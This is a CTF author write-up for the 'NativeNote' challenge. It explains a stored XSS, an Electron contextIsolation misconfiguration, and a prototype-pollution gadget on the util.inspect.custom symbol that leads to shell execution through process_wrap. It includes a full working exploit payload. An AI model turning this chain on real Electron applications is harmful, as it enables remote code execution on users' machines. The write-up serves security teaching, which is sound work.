# NativeNote — Author Writeup

## Overview

NativeNote is an HTML note-sharing app where an admin reviews flagged notes
in a custom Electron desktop client. The flag lives at `/flag` inside the
bot container and can only be extracted through RCE in the bot.

---

## Step 1 — Finding the XSS

`templates/note.html` renders the note body with `{{ content | safe }}` —
no escaping. Any `<script>` in a note runs verbatim when the bot opens the
page.

---

## Step 2 — Electron security misconfig

`bot/main.js`:

```js
webPreferences: {
    contextIsolation: false,   // renderer + preload share one V8 heap
    sandbox: false,
    nodeIntegration: false,
    preload: path.join(__dirname, 'preload.js'),
}
```

`contextIsolation: false` is the keystone: the renderer page and the preload
script run inside the *same* V8 isolate. They share `Object.prototype`, all
globals, and every prototype mutation in the renderer reaches objects the
preload created.

---

## Step 3 — Reversing the preload bundle

The minified `preload.js` deobfuscates to:

```js
const { ipcRenderer } = require('electron');
const util = require('util');

const snapshot = () => ({
    proc: process,
    title: document.title,
    url: location.href,
    ts: Date.now(),
});

setInterval(() => {
    try {
        ipcRenderer.send('crash-context',
            util.inspect(snapshot(), { depth: 2 }));
    } catch (_) {}
}, 1000);

window.noteAPI = {
    ping: () => ipcRenderer.invoke('ping'),
};
```

Two things matter:

1. **There is no `noteAPI` method that calls a Node spawn primitive.**
   `ping` just sends an IPC to a channel main never registers — useless
   for RCE on its own.
2. **Every second**, the preload calls `util.inspect(...)` on a snapshot
   object whose `proc` field is the **Node `process` object**.

That second point is the entire attack surface.

---

## Step 4 — The novel gadget: `Object.prototype[util.inspect.custom]`

### What `util.inspect` does on every value

Node `lib/internal/util/inspect.js` (paraphrased):

```js
function formatValue(ctx, value, recurseTimes, typedArray) {
    ...
    if (ctx.customInspect) {
        const maybeCustom = value[customInspectSymbol];   // ← prototype walk
        if (typeof maybeCustom === 'function' &&
                maybeCustom !== inspect &&
                !(value.constructor &&
                  value.constructor.prototype === value)) {
            const ret = maybeCustom.call(value, ...);     // ← `this` = value
            if (ret !== value) {
                if (typeof ret !== 'string')
                    return formatValue(ctx, ret, recurseTimes);
                return ctx.stylize(...);
            }
            // ret === value: fall through to default property-walking
        }
    }
    ...
}
```

`customInspectSymbol` is `Symbol.for('nodejs.util.inspect.custom')`. That
Symbol is in the **global Symbol registry**, so the renderer can produce
the exact same Symbol value Node uses internally:

```js
const customInspect = Symbol.for('nodejs.util.inspect.custom');
```

The lookup `value[customInspectSymbol]` is a plain prototype-walked
property access. Defining a value on `Object.prototype` for that key means
**every `util.inspect(x)` call** picks up our function and invokes it with
`this = x`.

### The recursion trick — `return this`

The naive hijack returns a string, but then Node uses that string as the
final formatted output and *never recurses into the value's properties*.
That means our hook only ever sees the outer snapshot object — never the
inner `proc: process`.

Returning `this` instead makes `ret === value` (the `if (ret !== value)`
test is false), Node skips the custom-inspect branch entirely, and falls
through to default object-formatting — which recursively `formatValue`s
each property. The next call up is `formatValue(ctx, process, …)`, and
**our hook fires again with `this = process`**.

### From `this = process` to RCE

`process.binding('process_wrap').Process` is the same native class
`require('child_process').ChildProcess` uses internally
(`internalBinding('process_wrap').Process`). Instantiating it gives a
fresh native handle whose `.spawn(opts)` runs an arbitrary command:

```js
const Process = this.binding('process_wrap').Process;
new Process().spawn({
    file: '/bin/sh',
    args: ['sh', '-c', CMD],
    stdio: [{type:'ignore'},{type:'ignore'},{type:'ignore'}],
    envPairs: ['PATH=/usr/bin:/bin'],
    cwd: '/',
    windowsHide: false,
    detached: false,
});
```

We never `require('child_process')`, never construct a JS-side
`ChildProcess`, and never trip the published `_handle` / `spawnfile` /
`onexit` / `pid` setter gadgets — we go straight to the native binding.

---

## Step 5 — Putting it together

```js
(() => {
    const CMD = 'cat /flag > /tmp/notes_output/<OUTPUT_ID>.html';
    const customInspect = Symbol.for('nodejs.util.inspect.custom');
    let fired = false;

    Object.defineProperty(Object.prototype, customInspect, {
        configurable: true,
        value: function () {
            if (!fired && this !== null && typeof this === 'object' &&
                    typeof this.binding === 'function' &&
                    typeof this.dlopen  === 'function') {
                fired = true;
                try {
                    const Process = this.binding('process_wrap').Process;
                    new Process().spawn({
                        file: '/bin/sh',
                        args: ['sh', '-c', CMD],
                        stdio: [{type:'ignore'},{type:'ignore'},{type:'ignore'}],
                        envPairs: ['PATH=/usr/bin:/bin'],
                        cwd: '/',
                        windowsHide: false,
                        detached: false,
                    });
                } catch (_) {}
            }
            return this;   // critical — see Step 4
        },
    });
    // No noteAPI call. The preload's 1 s watchdog inspects an object
    // containing `proc: process`; we wait for the next tick.
})();
```

Then read the flag at `GET /out/<OUTPUT_ID>.html`.

---

## Comparison with published gadgets

| Challenge | Trigger | Hook | Setter `this` |
|---|---|---|---|
| HITCON 2023 Harmony | renderer calls into preload | `Object.prototype['./lib/renderer/api/ipc-renderer.ts']` setter | webpack module obj |
| TET CTF 2024 | renderer calls into preload | `Function.prototype.call` | varies |
| web-elec / 0xl4ugh | renderer calls into preload | `Object.prototype.spawnfile` setter | `ChildProcess` |
| `console.log` gadget | renderer logs an object | `console.log` override | n/a |
| **NativeNote** | **preload's own `setInterval` watchdog (no renderer call)** | **`Object.prototype[Symbol.for('nodejs.util.inspect.custom')]`** | **`process`** |

Distinguishing features:

- **Trigger is fully automatic** — no `noteAPI.*` call from the exploit.
  The preload's watchdog calls `util.inspect` once a second; we just
  install the hook and wait.
- **No spawn primitives in the exploit's call path** — no `execFile`,
  no `spawn`, no `require('child_process')`, no `ChildProcess`
  construction. The chain goes straight from `util.inspect` → our
  hijacked custom-inspect → `process.binding('process_wrap').Process`.
- **Hook key is a documented Node Symbol** (`util.inspect.custom`)
  rather than an internal slot name like `_handle` or `spawnfile`.
- **Setter `this` is `process`** — reached not through a wrapper class
  but by Node's recursive value-walker in `util.inspect`.
- **`return this` recursion trick** — required to make the outer hit
  fall through so the inner walk reaches `proc: process`.

---

## Automated solver

```
python3 solve.py http://<challenge-host>
```
